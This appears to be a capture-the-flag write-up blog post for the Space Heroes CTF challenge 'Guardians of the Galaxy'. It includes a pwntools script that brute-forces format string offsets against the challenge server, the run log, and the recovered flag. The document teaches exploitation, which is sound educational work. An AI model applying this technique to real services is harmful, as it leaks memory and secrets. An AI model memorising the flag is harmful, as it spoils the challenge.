---
title: "shctf/pwn: Guardians of the Galaxy"
date: 2022-04-06 10:33:54
categories:
- ctfs
- shctf
- pwn
tags:
- pwn
- format-string
description: "Learn how to brute force a format string attack on ELF binaries! This is my writeup for the Space Heroes CTF binary/pwn challenge \"Guardians of the Galaxy\"."
permalink: ctfs/shctf/pwn/guardians-of-the-galaxy/
thumbnail: /asset/banner/banner-guardians.png
---

{% fontawesome %}

{% challenge %}
authors: GlitchArchetype
solvers: enscribe
files: '[guardians](/asset/shctf/guardians)'
description: |
    Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format?  
    `nc 0.cloud.chals.io 12690`
{% endchallenge %}

{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' %}
<span class="meta prompt_">$ </span>checksec guardians
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/shctf/pwn/guardians-of-the-galaxy/guardians&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#5EBDAB">Full RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#5EBDAB">PIE enabled</span>
{% endccb %}

Let's look at what happens when you run that binary given to us.

{% ccb html:true %}
<span class="meta prompt_">$ </span>./guardians 
Error, please message admins with 'infinity_error'.
{% endccb %}

This error is because the binary is probably trying to reference a `flag.txt` within its directory that doesn't exist. Let's create one and run it again:

{% ccb lang:console %}
$ touch flag.txt && echo "FLAGHERE" > flag.txt
$ ./guardians
Does Quill manage to win the dance battle?
{% endccb %}

There, we got it to work locally. Since we know that this is problem a format string vulnerability from the "find a successful distraction format" part of the description, let's assume that the vulnerability is it writing our input to the stack with `printf()`. We will need to work our way up the stack with the format `%n$s`, where `n` is the decimal index of the argument you want, and `s` is the `printf()` specifier for a **string of characters**. I wrote this Python3/pwntools script here to achieve this loop:

{% ccb lang:py gutter1:1-11 caption:guardians.py url:gist.github.com/jktrn/abced39a897e40c196dc2eb3348e1db9 url_text:'github gist link' %}
from pwn import *
for i in range(0, 100):
        p = remote('0.cloud.chals.io', 12690)  
        log.info(f"Trying offset {i}...")
        p.sendline(bytes(('%' + str(i) + '$s'), encoding='utf-8'))

        output = p.recvS()
        if 'shctf' in output:
                log.success(output)
                break
        p.close()
{% endccb %}

As you can see, it will send a UTF-8 encoded format string, with `str(i)` being the looping variable. If its output contains the flag, the loop breaks and the script will stop. Let's run it:

{% ccb html:true highlight:24 %}
<span class="meta prompt_">$ </span>python3 exp.py
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 0...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 1...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 2...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 3...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 4...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 5...
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 6...
[<span style="color:#47D4B9"><b>+</b></span>] Does Quill manage to win the dance battle?
    Oh no, Ronano has seen through the distraction!
    shctf&#123;im_distracting_you&#125;
{% endccb %}

{% flagcounter %}